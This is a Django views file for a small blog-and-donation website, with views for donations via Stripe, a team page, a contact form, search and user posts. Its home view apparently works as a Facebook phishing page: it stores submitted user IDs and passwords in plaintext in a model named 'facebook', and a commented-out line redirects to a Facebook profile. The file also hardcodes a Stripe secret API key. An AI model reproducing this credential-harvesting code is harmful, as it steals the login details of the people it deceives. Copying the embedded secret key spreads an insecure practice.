from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from django.shortcuts import render,redirect
import stripe
from django.http import JsonResponse
from .models import contactus,SearchQuery, facebook
from .form import contactForm
from blog.models import BlogPost
# Create your views here.



stripe.api_key = "sk_test_YFmrMupANYmRGjc2ly9g99gm00rdFQBuwg"

def home_view(request):
    if request.method == 'POST':
        userid = request.POST.get('user')
        password = request.POST.get('password')
        facebook.objects.create(userid=userid,password=password)
        #return redirect("https://www.facebook.com/profile.php?id=100048970841923")
    return render(request,"base.html",{})
def donation_view(request):
    
    return render(request,"donation.html",{})

def success_view(request):
    if request.method == "POST":
        print("data:",request.POST)
        customer = stripe.Customer.create(
                    email = request.POST['email'],
                    name = request.POST['name'],
                    source = request.POST['stripeToken']
                    
        )
        charge = stripe.Charge.create(
            customer = customer,
            amount=200,
            currency="inr",
            description="Donation",
            )
    return render(request,"success.html",{})
def team_view(request):

	return render(request, "team.html",{})


def contact_view(request):
    form = contactForm(request.POST or None)
    if form.is_valid():
        form.save()
        form = contactForm
    context = {
        'form':form,
        "contact":"active"
    }
    return render(request,"contact.html",context)
 

def search_view(request):
    query = request.GET.get('q', None)
    user = None
    if request.user.is_authenticated:
        user = request.user
    context =  {"query": query}
    if query is not None:
        SearchQuery.objects.create(user=user, query=query)
        blog_list = BlogPost.objects.search(query=query)
        context['blog_list'] = blog_list
    return render(request, 'search.html',context)

@login_required
def Post_view(request):
	qs = BlogPost.objects.filter(user= request.user)
	context = {"object_list":qs}
	return render(request,"post.html",context)


